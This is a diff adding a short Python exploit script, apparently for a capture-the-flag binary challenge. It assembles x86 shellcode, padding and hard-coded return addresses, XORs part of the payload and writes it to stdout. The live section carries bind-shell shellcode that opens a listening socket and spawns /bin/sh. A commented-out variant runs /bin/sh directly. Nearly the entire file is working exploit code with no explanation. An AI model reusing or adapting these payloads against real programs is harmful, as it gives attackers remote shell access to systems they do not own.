@@ -1,0 +1,52 @@
+#!/usr/bin/python3
+
+def fuck8(txt):
+    assert(len(txt) == 8)
+    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
+
+def revert(txt):
+    assert(len(txt) % 8 == 0)
+    res = ""
+    for i in range(int(len(txt) / 8)):
+        res += fuck8(txt[i*8:(i+1)*8])
+    return res
+
+######## run /bin/sh
+##shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+#shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a" # the length is 40byte, run /bin/sh
+#shellcode_fill = "31" * (40 - int(len(shellcode)/2))
+#
+##payload = shellcode + shellcode_fill + revert('0804a790' + '08048928' + '0804892c' + '08048941')
+#payload = shellcode + shellcode_fill + revert('0804a790' + '08048680' + '0804a790' + '08048949' + '0804a79c' + '31313131' + '0804893a')
+#
+#import binascii
+#
+#b = binascii.unhexlify(payload)
+#b = bytes([byte^0x42 for byte in b[:32]]) + b[32:]
+#
+#with open('/dev/fd/1','wb') as f:
+#    f.write(b)
+#
+##########
+
+######### run bind
+
+shellcode = "e8000000005883c03fffe0" # jmp to new_shellcode
+nop = "90" * 5
+new_shellcode = "e8ffffffffc35d8d6d4a31c0996a015b52536a02ffd5965b5266682b67665389e16a105156ffd543435256ffd543525256ffd59359b03fcd804979f9b00b52682f2f7368682f62696e89e35253eb045f6a665889e1cd8057c3"
+
+shellcode_fill = "31" * (40 - int(len(shellcode)/2))
+
+#payload = shellcode + shellcode_fill + revert('0804a790' + '08048928' + '0804892c' + '08048941')
+payload = shellcode + shellcode_fill + revert('0804a790' + '08048680' + '0804a790' + '08048949' + '0804a79c' + '31313131' + '0804893a')
+payload = payload + nop + new_shellcode
+
+import binascii
+
+b = binascii.unhexlify(payload)
+b = bytes([byte^0x42 for byte in b[:32]]) + b[32:]
+
+with open('/dev/fd/1','wb') as f:
+    f.write(b)
+
+
